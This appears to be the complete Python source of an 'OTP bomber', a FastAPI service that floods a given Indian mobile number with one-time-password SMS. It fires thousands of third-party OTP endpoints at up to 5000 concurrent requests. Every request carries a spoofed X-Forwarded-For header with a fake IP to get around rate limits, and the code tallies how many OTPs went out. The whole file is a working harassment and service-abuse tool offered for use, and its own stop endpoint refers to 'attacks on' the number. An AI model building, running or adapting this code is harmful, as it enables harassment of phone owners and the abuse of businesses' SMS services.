#!/usr/bin/env python3
"""
🔥 ULTIMATE OTP BOMBER - FINAL COMPLETE VERSION 🔥
Combines: apis.py + apis1.py + apis2.py + apis3.py + apis4.py
Total APIs: 3000+ | Super Fast | Async
"""
import asyncio
import time
import random
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ==============================================================================
# 🔥 IMPORT ALL API FILES
# ==============================================================================

try:
    from apis import ULTIMATE_APIS as APIS_1
    print(f"✅ apis.py loaded: {len(APIS_1)} APIs")
except Exception as e:
    print(f"⚠️  apis.py not found: {e}")
    APIS_1 = []

try:
    from apis1 import ULTIMATE_APIS as APIS_2
    print(f"✅ apis1.py loaded: {len(APIS_2)} APIs")
except Exception as e:
    print(f"⚠️  apis1.py not found: {e}")
    APIS_2 = []

try:
    from apis2 import ULTIMATE_APIS_2 as APIS_3
    print(f"✅ apis2.py loaded: {len(APIS_3)} APIs")
except Exception as e:
    print(f"⚠️  apis2.py not found: {e}")
    APIS_3 = []

try:
    from apis3 import ULTIMATE_APIS_3 as APIS_4
    print(f"✅ apis3.py loaded: {len(APIS_4)} APIs")
except Exception as e:
    print(f"⚠️  apis3.py not found: {e}")
    APIS_4 = []

try:
    from apis4 import ULTIMATE_APIS_4 as APIS_5
    print(f"✅ apis4.py loaded: {len(APIS_5)} APIs")
except Exception as e:
    print(f"⚠️  apis4.py not found: {e}")
    APIS_5 = []

# ==============================================================================
# 🔥 COMBINE ALL APIs
# ==============================================================================

ULTIMATE_APIS = APIS_1 + APIS_2 + APIS_3 + APIS_4 + APIS_5
TOTAL_APIS = len(ULTIMATE_APIS)

print(f"\n{'='*60}")
print(f"🔥 TOTAL APIs LOADED: {TOTAL_APIS}")
print(f"{'='*60}\n")

# ==============================================================================
# ⚡ UVLOOP (Ultra Fast Event Loop)
# ==============================================================================

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop installed (super fast mode)")
except ImportError:
    print("⚠️  uvloop not installed (using default asyncio)")

# ==============================================================================
# 🚀 FASTAPI APP
# ==============================================================================

app = FastAPI(title="Ultimate OTP Bomber", version="4.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# ==============================================================================
# ⚙️ CONFIGURATION
# ==============================================================================

MAX_CONCURRENT = 5000
BATCH_CHUNK = 500
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 4
OTP_KEYWORDS = ("success", "sent", "otp", "verified", "delivered", "true", "ok", "message")

FAKE_IPS = [
    "103.159.84.134", "49.36.180.11", "157.32.75.10",
    "182.70.117.55", "106.51.85.20", "47.11.248.163",
    "13.234.100.50", "52.66.200.100", "13.126.50.75",
    "104.211.50.25", "20.198.100.75", "13.232.150.25"
]

# ==============================================================================
# 📊 STATE MANAGEMENT
# ==============================================================================

_jobs = {}
_stop_flags = set()
_stats = defaultdict(lambda: {
    "total": 0, "ok": 0, "otp": 0, "fail": 0, "start": 0
})

# ==============================================================================
# 🔥 CORE FIRING FUNCTION
# ==============================================================================

async def fire_one(session, api, phone, stats, ip):
    try:
        if callable(api.get("url")):
            url = api["url"](phone)
        else:
            url = api["url"]

        headers = dict(api.get("headers", {}))
        headers["X-Forwarded-For"] = ip
        headers["Client-IP"] = ip
        headers["X-Real-IP"] = ip

        data = None
        if api.get("data"):
            if callable(api["data"]):
                data = api["data"](phone)
            else:
                data = api["data"]

        method = api.get("method", "POST").upper()

        if method == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""

        stats["total"] += 1

        if status < 400:
            stats["ok"] += 1
            if any(k in txt[:500].lower() for k in OTP_KEYWORDS):
                stats["otp"] += 1
                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
            else:
                print(f"  🟡 [{api['name']}] HTTP {status}")
        else:
            stats["fail"] += 1

    except asyncio.TimeoutError:
        stats["total"] += 1
        stats["fail"] += 1
    except Exception:
        stats["total"] += 1
        stats["fail"] += 1

# ==============================================================================
# 🔥 WORKER
# ==============================================================================

async def worker(job_id, phone, count):
    _stop_flags.discard(phone)

    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT,
        limit_per_host=50,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True
    )

    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
        sock_read=REQUEST_TIMEOUT
    )

    stats = _stats[phone]
    stats["total"] = 0
    stats["ok"] = 0
    stats["otp"] = 0
    stats["fail"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"🔥 [{job_id}] FIRING {TOTAL_APIS} APIs → +91{phone}")
    print(f"🔁 Cycles: {count}")
    print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
    print(f"{'='*70}\n")

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for cycle in range(count):
                if phone in _stop_flags:
                    print(f"🛑 [{job_id}] STOPPED by user")
                    break

                print(f"\n🚀 CYCLE {cycle+1}/{count} STARTED\n")

                tasks = []
                for api in ULTIMATE_APIS:
                    ip = random.choice(FAKE_IPS)
                    tasks.append(fire_one(session, api, phone, stats, ip))

                for i in range(0, len(tasks), BATCH_CHUNK):
                    if phone in _stop_flags:
                        break
                    batch = tasks[i:i + BATCH_CHUNK]
                    await asyncio.gather(*batch, return_exceptions=True)

                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0

                print(f"\n{'─'*70}")
                print(f"✅ CYCLE {cycle+1}/{count} DONE")
                print(f"📊 Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']}")
                print(f"⚡ Speed: {rps:.1f} req/sec")
                print(f"{'─'*70}\n")

                await asyncio.sleep(0.1)

    except Exception as e:
        print(f"❌ Worker error: {e}")
    finally:
        _jobs.pop(job_id, None)
        total_time = time.time() - stats["start"]
        print(f"\n{'='*70}")
        print(f"🏁 JOB COMPLETE: {job_id}")
        print(f"📱 Target: +91{phone}")
        print(f"📊 Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']}")
        print(f"⏱️  Time: {total_time:.2f}s | Speed: {stats['total']/total_time:.1f} req/s")
        print(f"{'='*70}\n")

# ==============================================================================
# 🌐 API ENDPOINTS
# ==============================================================================

@app.get("/")
async def root():
    return {
        "status": "🔥 ULTIMATE OTP BOMBER RUNNING",
        "total_apis": TOTAL_APIS,
        "apis_breakdown": {
            "apis.py": len(APIS_1),
            "apis1.py": len(APIS_2),
            "apis2.py": len(APIS_3),
            "apis3.py": len(APIS_4),
            "apis4.py": len(APIS_5)
        },
        "endpoints": {
            "fire": "/send?number=9876543210&count=1",
            "stop": "/stop?number=9876543210",
            "stats": "/stats?number=9876543210",
            "list_apis": "/apis",
            "jobs": "/jobs"
        }
    }

@app.get("/apis")
async def list_apis():
    return {
        "total": TOTAL_APIS,
        "apis": [
            {"name": a["name"], "url": a["url"] if not callable(a["url"]) else "dynamic"}
            for a in ULTIMATE_APIS
        ]
    }

@app.get("/send")
async def send(
    bg: BackgroundTasks,
    number: str = Query(..., description="10 digit mobile number"),
    count: int = Query(1, ge=1, le=100, description="Number of cycles")
):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")

    if not number.isdigit() or len(number) != 10:
        return JSONResponse(
            {"error": "Invalid number. Must be 10 digits."},
            status_code=400
        )

    job_id = str(uuid4())[:8]
    _jobs[job_id] = {
        "number": number,
        "count": count,
        "started": time.time()
    }

    bg.add_task(worker, job_id, number, count)

    return {
        "success": True,
        "job_id": job_id,
        "target": f"+91{number}",
        "total_apis": TOTAL_APIS,
        "cycles": count,
        "total_requests": count * TOTAL_APIS,
        "message": f"🔥 FIRING {TOTAL_APIS} APIs x {count} cycles = {count * TOTAL_APIS} requests"
    }

@app.get("/stop")
async def stop(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    _stop_flags.add(number)

    return {
        "success": True,
        "message": f"🛑 Stopping attacks on {number}",
        "stopped": number
    }

@app.get("/stats")
async def stats(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    s = _stats.get(number)

    if not s or not s.get("start"):
        return {"error": "No stats found for this number"}

    elapsed = time.time() - s["start"]
    return {
        "number": number,
        "total": s["total"],
        "ok": s["ok"],
        "otp": s["otp"],
        "fail": s["fail"],
        "elapsed_seconds": round(elapsed, 2),
        "requests_per_second": round(s["total"] / elapsed if elapsed else 0, 1),
        "success_rate": f"{(s['ok'] / s['total'] * 100):.1f}%" if s['total'] else "0%"
    }

@app.get("/jobs")
async def jobs():
    return {
        "active_jobs": len(_jobs),
        "jobs": _jobs
    }

# ==============================================================================
# 🚀 MAIN ENTRY POINT
# ==============================================================================

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥  ULTIMATE OTP BOMBER v4.0  🔥                          ║
║                                                              ║
║   📊 Total APIs Loaded: {TOTAL_APIS:<35}║
║   ⚡ Max Concurrent: {MAX_CONCURRENT:<39}║
║   🚀 Server: http://0.0.0.0:5000                            ║
║                                                              ║
║   📦 API Files Loaded:                                       ║
║   ▸ apis.py   : {len(APIS_1):<44}║
║   ▸ apis1.py  : {len(APIS_2):<44}║
║   ▸ apis2.py  : {len(APIS_3):<44}║
║   ▸ apis3.py  : {len(APIS_4):<44}║
║   ▸ apis4.py  : {len(APIS_5):<44}║
║                                                              ║
║   📱 Endpoints:                                              ║
║   ▸ /send?number=9876543210&count=1                         ║
║   ▸ /stop?number=9876543210                                 ║
║   ▸ /stats?number=9876543210                                ║
║   ▸ /apis                                                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=5000,
        log_level="warning",
        access_log=False
    )
